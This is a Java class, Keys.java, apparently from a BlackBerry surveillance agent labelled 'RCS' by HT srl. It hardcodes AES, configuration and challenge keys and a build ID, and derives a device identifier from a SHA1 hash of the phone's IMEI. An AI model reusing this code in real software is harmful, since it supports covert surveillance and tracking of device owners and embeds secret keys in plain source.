/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Keys.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.config;

import net.rim.device.api.system.GPRSInfo;
import com.ht.rcs.blackberry.crypto.Encryption;
import com.ht.rcs.blackberry.interfaces.Singleton;
import com.ht.rcs.blackberry.utils.Utils;

public class Keys implements Singleton  {
    private static String conf = "Adf5V57gQtyi90wUhpb8Neg56756j87R";
    private static String aes = "3j9WmmDgBqyU270FTid3719g64bP4s52"; // markup,
    // log
    private static String instanceID = "bg5etG87q20Kg52W5Fg1";
    public static String buildID = "av3pVck1gb4eR2d8";

    private static String challenge = "f7Hk0f5usd04apdvqw13F5ed25soV5eD";
    private static String confName = "c3mdX053du1YJ541vqWILrc4Ff71pViL"; // wchar

    public static byte[] byteAesKey;
    public static byte[] byteChallengeKey;
    public static byte[] byteConfKey;
    public static byte[] byteConfNameKey;

    static Keys instance=null;
    private Keys() {         
        byte[] imei = GPRSInfo.getIMEI();
        instanceID =  Utils.byteArrayToHex(Encryption.SHA1(imei));        
    };
    
    public synchronized static Keys getInstance()
    {
        if(instance == null)
        {
            instance = new Keys();            
        }
        
        return instance;
    }
    
    public byte[] getAesKey() {
        if (byteAesKey == null) {
            byteAesKey = keyFromString(aes);
        }
        return byteAesKey;
    }

    public byte[] getBuildId() {
        return buildID.getBytes();
    }

    public byte[] getChallengeKey() {
        if (byteChallengeKey == null) {
            byteChallengeKey = keyFromString(challenge);
        }

        return byteChallengeKey;
    }

    public byte[] getConfKey() {
        if (byteConfKey == null) {
            byteConfKey = keyFromString(conf);
        }

        return byteConfKey;
    }
    
    public byte[] getConfNameKey() {
        if (byteConfNameKey == null) {
            byteConfNameKey = keyFromString(confName);
        }

        return byteConfNameKey;
    }

    public byte[] getInstanceId() {

        return instanceID.getBytes();
    }

    private byte[] keyFromString(String string) {
        byte[] key = new byte[16];
        Utils.copy(key, 0, string.getBytes(), 0, 16);
        return key;
    }
    
}
